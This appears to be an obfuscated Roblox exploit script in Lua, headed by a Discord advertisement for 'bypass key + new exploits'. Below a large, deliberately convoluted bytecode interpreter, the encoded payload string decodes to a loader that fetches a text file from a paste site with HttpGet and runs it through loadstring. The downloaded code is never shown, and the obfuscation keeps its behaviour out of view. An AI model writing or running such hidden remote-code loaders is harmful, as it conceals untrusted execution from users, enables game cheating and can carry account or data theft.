-- Join discord!!!  https://discord.gg/fVzqJnHKsJ
-- Bypass key + new exploits + new scripts etc





























local v0 = tonumber;
local v1 = string.byte;
local v2 = string.char;
local v3 = string.sub;
local v4 = string.gsub;
local v5 = string.rep;
local v6 = table.concat;
local v7 = table.insert;
local v8 = math.ldexp;
local v9 = getfenv or function()
	return _ENV;
end;
local v10 = setmetatable;
local v11 = pcall;
local v12 = select;
local v13 = unpack or table.unpack;
local v14 = tonumber;
local function v15(v16, v17, ...)
	local v18 = 1;
	local v19;
	v16 = v4(v3(v16, 5), "..", function(v30)
		if (v1(v30, 2) == 79) then
			v19 = v0(v3(v30, 1, 1));
			return "";
		else
			local v82 = v2(v0(v30, 16));
			if v19 then
				local v88 = 0;
				local v89;
				while true do
					if (v88 == 1) then
						return v89;
					end
					if (v88 == 0) then
						v89 = v5(v82, v19);
						v19 = nil;
						v88 = 1;
					end
				end
			else
				return v82;
			end
		end
	end);
	local function v20(v31, v32, v33)
		if v33 then
			local v83 = (v31 / ((5 - (1 + 2)) ^ (v32 - 1))) % ((5 - 3) ^ (((v33 - (1 - 0)) - (v32 - (2 - 1))) + (620 - (88 + 467 + 64))));
			return v83 - (v83 % (878 - (282 + 595)));
		else
			local v84 = (933 - (857 + 74)) ^ (v32 - (569 - (367 + 201)));
			return (((v31 % (v84 + v84)) >= v84) and (928 - (214 + 713))) or 0;
		end
	end
	local function v21()
		local v34 = v1(v16, v18, v18);
		v18 = v18 + 1;
		return v34;
	end
	local function v22()
		local v35 = 1637 - ((6631 - 5108) + 114);
		local v36;
		local v37;
		while true do
			if (v35 == 0) then
				v36, v37 = v1(v16, v18, v18 + 2);
				v18 = v18 + 2 + 0;
				v35 = 1 - 0;
			end
			if (v35 == (1066 - (68 + 997))) then
				return (v37 * (1526 - (226 + (1161 - (32 + 85))))) + v36;
			end
		end
	end
	local function v23()
		local v38, v39, v40, v41 = v1(v16, v18, v18 + 3);
		v18 = v18 + 4 + 0;
		return (v41 * 16777216) + (v40 * (14533 + 51003)) + (v39 * (1213 - (892 + 65))) + v38;
	end
	local function v24()
		local v42 = v23();
		local v43 = v23();
		local v44 = 2 - 1;
		local v45 = (v20(v43, 1 - (0 + 0), 36 - (807 - (368 + 423))) * (2 ^ (382 - (87 + (826 - 563))))) + v42;
		local v46 = v20(v43, 201 - ((85 - (10 + 8)) + 113), 23 + 8);
		local v47 = ((v20(v43, 78 - 46) == (1 + 0)) and -1) or (3 - 2);
		if (v46 == (952 - ((3084 - 2282) + 150))) then
			if (v45 == (0 - 0)) then
				return v47 * (0 - 0);
			else
				local v90 = 0 + 0;
				while true do
					if (v90 == 0) then
						v46 = 998 - (915 + 82);
						v44 = 0 - 0;
						break;
					end
				end
			end
		elseif (v46 == (1193 + 854)) then
			return ((v45 == (0 - (442 - (416 + 26)))) and (v47 * ((1188 - (1069 + 118)) / (0 - 0)))) or (v47 * NaN);
		end
		return v8(v47, v46 - (2237 - 1214)) * (v44 + (v45 / ((1 + 1) ^ ((293 - 201) - 40))));
	end
	local function v25(v48)
		local v49;
		if not v48 then
			local v85 = 0 + 0;
			while true do
				if (v85 == (430 - (44 + 386))) then
					v48 = v23();
					if (v48 == (1486 - (998 + 488))) then
						return "";
					end
					break;
				end
			end
		end
		v49 = v3(v16, v18, (v18 + v48) - (1 + 0));
		v18 = v18 + v48;
		local v50 = {};
		for v66 = (773 - (201 + 571)) - 0, #v49 do
			v50[v66] = v2(v1(v3(v49, v66, v66)));
		end
		return v6(v50);
	end
	local v26 = v23;
	local function v27(...)
		return {...}, v12("#", ...);
	end
	local function v28()
		local v51 = 0;
		local v52;
		local v53;
		local v54;
		local v55;
		local v56;
		local v57;
		local v58;
		local v59;
		while true do
			if ((1 + 3) == v51) then
				while true do
					if (v52 ~= (204 - (14 + 188))) then
					else
						v57 = nil;
						v58 = nil;
						v52 = 678 - (534 + 141);
					end
					if (v52 == 0) then
						local v97 = 0;
						while true do
							if (v97 == (0 + 0)) then
								v53 = 0 + 0;
								v54 = nil;
								v97 = 1;
							end
							if (v97 == (1 + 0)) then
								v52 = 1 - 0;
								break;
							end
						end
					end
					if (v52 ~= (1 - 0)) then
					else
						local v98 = 0 - 0;
						while true do
							if (v98 == 0) then
								v55 = nil;
								v56 = nil;
								v98 = 1 + 0;
							end
							if ((1 + 0) == v98) then
								v52 = 398 - (115 + 281);
								break;
							end
						end
					end
					if ((6 - 3) == v52) then
						v59 = nil;
						while true do
							local v99 = 0;
							while true do
								if ((0 + 0) ~= v99) then
								else
									local v100 = 0 - 0;
									while true do
										if (v100 == (0 - 0)) then
											if (v53 == (867 - (550 + 317))) then
												local v133 = 0 - 0;
												while true do
													if (2 == v133) then
														v53 = 1 - 0;
														break;
													end
													if (0 ~= v133) then
													else
														v54 = {};
														v55 = {};
														v133 = 2 - 1;
													end
													if (v133 == (286 - (134 + 151))) then
														v56 = {};
														v57 = {v54,v55,nil,v56};
														v133 = 2;
													end
												end
											end
											if (v53 == (3 - 1)) then
												local v134 = 1990 - (582 + 1408);
												while true do
													if (v134 ~= (3 - 2)) then
													else
														return v57;
													end
													if (v134 == 0) then
														local v151 = 0;
														while true do
															if (v151 == (1 - 0)) then
																v134 = 1;
																break;
															end
															if (v151 ~= (0 - 0)) then
															else
																for v158 = 1825 - (1195 + 629), v23() do
																	local v159 = 0;
																	local v160;
																	local v161;
																	while true do
																		if (v159 == (1 - 0)) then
																			while true do
																				if (v160 == (241 - (187 + 54))) then
																					v161 = v21();
																					if (v20(v161, 1, 1) ~= 0) then
																					else
																						local v169 = 780 - (162 + 618);
																						local v170;
																						local v171;
																						local v172;
																						while true do
																							if (v169 ~= (1 + 0)) then
																							else
																								local v173 = 0 + 0;
																								while true do
																									if (v173 ~= (0 - 0)) then
																									else
																										v172 = {v22(),v22(),nil,nil};
																										if (v170 == (1636 - (1373 + 263))) then
																											local v183 = 0;
																											local v184;
																											while true do
																												if (v183 == (1000 - (451 + 549))) then
																													v184 = 0;
																													while true do
																														if (v184 == 0) then
																															v172[1 + 2] = v22();
																															v172[5 - 1] = v22();
																															break;
																														end
																													end
																													break;
																												end
																											end
																										elseif (v170 == 1) then
																											v172[3] = v23();
																										elseif (v170 == (2 - 0)) then
																											v172[3] = v23() - (2 ^ 16);
																										elseif (v170 == 3) then
																											local v190 = 1384 - (746 + 638);
																											while true do
																												if (v190 ~= 0) then
																												else
																													v172[3] = v23() - (2 ^ 16);
																													v172[4] = v22();
																													break;
																												end
																											end
																										end
																										v173 = 1;
																									end
																									if (v173 == (1 + 0)) then
																										v169 = 2;
																										break;
																									end
																								end
																							end
																							if (v169 == 2) then
																								if (v20(v171, 1, 1 - 0) == 1) then
																									v172[343 - (218 + 123)] = v59[v172[1583 - (1535 + 46)]];
																								end
																								if (v20(v171, 2 + 0, 2) ~= (1 + 0)) then
																								else
																									v172[563 - (306 + 254)] = v59[v172[1 + 2]];
																								end
																								v169 = 3;
																							end
																							if (v169 == 0) then
																								local v174 = 0 - 0;
																								local v175;
																								while true do
																									if (v174 == (1467 - (899 + 568))) then
																										v175 = 0 + 0;
																										while true do
																											if (v175 ~= (2 - 1)) then
																											else
																												v169 = 604 - (268 + 335);
																												break;
																											end
																											if (v175 ~= (290 - (60 + 230))) then
																											else
																												local v185 = 0;
																												while true do
																													if (v185 == 0) then
																														v170 = v20(v161, 2, 3);
																														v171 = v20(v161, 576 - (426 + 146), 1 + 5);
																														v185 = 1457 - (282 + 1174);
																													end
																													if (v185 ~= 1) then
																													else
																														v175 = 1;
																														break;
																													end
																												end
																											end
																										end
																										break;
																									end
																								end
																							end
																							if (v169 == 3) then
																								if (v20(v171, 3, 814 - (569 + 242)) ~= (2 - 1)) then
																								else
																									v172[4] = v59[v172[1 + 3]];
																								end
																								v54[v158] = v172;
																								break;
																							end
																						end
																					end
																					break;
																				end
																			end
																			break;
																		end
																		if (v159 ~= 0) then
																		else
																			local v167 = 0;
																			while true do
																				if (v167 == (1024 - (706 + 318))) then
																					v160 = 1251 - (721 + 530);
																					v161 = nil;
																					v167 = 1272 - (945 + 326);
																				end
																				if (1 ~= v167) then
																				else
																					v159 = 1;
																					break;
																				end
																			end
																		end
																	end
																end
																for v162 = 1, v23() do
																	v55[v162 - (2 - 1)] = v28();
																end
																v151 = 1 + 0;
															end
														end
													end
												end
											end
											v100 = 1;
										end
										if (1 == v100) then
											v99 = 1;
											break;
										end
									end
								end
								if (1 == v99) then
									if (v53 == (701 - (271 + 429))) then
										local v101 = 0 + 0;
										local v102;
										while true do
											if (v101 == (1500 - (1408 + 92))) then
												v102 = 1086 - (461 + 625);
												while true do
													if (2 == v102) then
														v53 = 2;
														break;
													end
													if (v102 == 1) then
														for v154 = 1289 - (993 + 295), v58 do
															local v155 = 0 + 0;
															local v156;
															local v157;
															while true do
																if (v155 == (1171 - (418 + 753))) then
																	local v164 = 0 + 0;
																	local v165;
																	while true do
																		if (v164 == (0 + 0)) then
																			v165 = 0;
																			while true do
																				if (v165 ~= (1 + 0)) then
																				else
																					v155 = 1;
																					break;
																				end
																				if (v165 ~= (0 + 0)) then
																				else
																					local v168 = 0;
																					while true do
																						if (v168 == (530 - (406 + 123))) then
																							v165 = 1;
																							break;
																						end
																						if (v168 == (1769 - (1749 + 20))) then
																							v156 = v21();
																							v157 = nil;
																							v168 = 1 + 0;
																						end
																					end
																				end
																			end
																			break;
																		end
																	end
																end
																if (v155 == (1323 - (1249 + 73))) then
																	if (v156 == (1 + 0)) then
																		v157 = v21() ~= 0;
																	elseif (v156 == (1147 - (466 + 679))) then
																		v157 = v24();
																	elseif (v156 ~= (6 - 3)) then
																	else
																		v157 = v25();
																	end
																	v59[v154] = v157;
																	break;
																end
															end
														end
														v57[3] = v21();
														v102 = 5 - 3;
													end
													if (v102 == 0) then
														local v153 = 0;
														while true do
															if (v153 ~= 1) then
															else
																v102 = 1901 - (106 + 1794);
																break;
															end
															if (v153 == 0) then
																v58 = v23();
																v59 = {};
																v153 = 1 + 0;
															end
														end
													end
												end
												break;
											end
										end
									end
									break;
								end
							end
						end
						break;
					end
				end
				break;
			end
			if (v51 == (1 + 0)) then
				v54 = nil;
				v55 = nil;
				v51 = 5 - 3;
			end
			if (v51 == 2) then
				v56 = nil;
				v57 = nil;
				v51 = 3;
			end
			if (v51 == 0) then
				v52 = 0 - 0;
				v53 = nil;
				v51 = 115 - (4 + 110);
			end
			if (v51 ~= 3) then
			else
				v58 = nil;
				v59 = nil;
				v51 = 588 - (57 + 527);
			end
		end
	end
	local function v29(v60, v61, v62)
		local v63 = v60[1];
		local v64 = v60[2];
		local v65 = v60[3];
		return function(...)
			local v68 = v63;
			local v69 = v64;
			local v70 = v65;
			local v71 = v27;
			local v72 = 1;
			local v73 = -1;
			local v74 = {};
			local v75 = {...};
			local v76 = v12("#", ...) - 1;
			local v77 = {};
			local v78 = {};
			for v86 = 0, v76 do
				if (v86 >= v70) then
					v74[v86 - v70] = v75[v86 + 1];
				else
					v78[v86] = v75[v86 + 1];
				end
			end
			local v79 = (v76 - v70) + 1;
			local v80;
			local v81;
			while true do
				local v87 = 0;
				while true do
					if (v87 == 1) then
						if (v81 <= 6) then
							if (v81 <= 2) then
								if (v81 <= 0) then
									do
										return;
									end
								elseif (v81 == 1) then
									local v103 = v80[2];
									v78[v103] = v78[v103](v13(v78, v103 + 1, v73));
								else
									v78[v80[2]] = v80[3];
								end
							elseif (v81 <= 4) then
								if (v81 > 3) then
									v78[v80[2]] = v80[3];
								else
									local v109 = 0;
									local v110;
									local v111;
									local v112;
									local v113;
									while true do
										if (0 == v109) then
											v110 = v80[2];
											v111, v112 = v71(v78[v110](v13(v78, v110 + 1, v80[3])));
											v109 = 1;
										end
										if (v109 == 1) then
											v73 = (v112 + v110) - 1;
											v113 = 0;
											v109 = 2;
										end
										if (2 == v109) then
											for v148 = v110, v73 do
												v113 = v113 + 1;
												v78[v148] = v111[v113];
											end
											break;
										end
									end
								end
							elseif (v81 == 5) then
								v78[v80[2]]();
							else
								local v114 = 0;
								local v115;
								local v116;
								while true do
									if (1 == v114) then
										v78[v115 + 1] = v116;
										v78[v115] = v116[v80[4]];
										break;
									end
									if (v114 == 0) then
										v115 = v80[2];
										v116 = v78[v80[3]];
										v114 = 1;
									end
								end
							end
						elseif (v81 <= 9) then
							if (v81 <= 7) then
								do
									return;
								end
							elseif (v81 == 8) then
								local v117 = 0;
								local v118;
								while true do
									if (v117 == 0) then
										v118 = v80[2];
										v78[v118] = v78[v118](v13(v78, v118 + 1, v73));
										break;
									end
								end
							else
								local v119 = v80[2];
								local v120, v121 = v71(v78[v119](v13(v78, v119 + 1, v80[3])));
								v73 = (v121 + v119) - 1;
								local v122 = 0;
								for v130 = v119, v73 do
									v122 = v122 + 1;
									v78[v130] = v120[v122];
								end
							end
						elseif (v81 <= 11) then
							if (v81 > 10) then
								v78[v80[2]] = v62[v80[3]];
							else
								v78[v80[2]]();
							end
						elseif (v81 == 12) then
							local v125 = 0;
							local v126;
							local v127;
							while true do
								if (1 == v125) then
									v78[v126 + 1] = v127;
									v78[v126] = v127[v80[4]];
									break;
								end
								if (v125 == 0) then
									v126 = v80[2];
									v127 = v78[v80[3]];
									v125 = 1;
								end
							end
						else
							v78[v80[2]] = v62[v80[3]];
						end
						v72 = v72 + 1;
						break;
					end
					if (v87 == 0) then
						v80 = v68[v72];
						v81 = v80[1];
						v87 = 1;
					end
				end
			end
		end;
	end
	return v29(v28(), {}, v17)(...);
end
return v15("LOL!043O00030A3O006C6F6164737472696E6703043O0067616D6503073O00482O747047657403243O00682O7470733A2O2F70617374652E6D79636F6E616E2E6E65742F3439342O32372E74787400083O00120D3O00013O00120D000100023O00200C000100010003001202000300044O0009000100034O00085O00022O00053O000100016O00017O00", v9(), ...);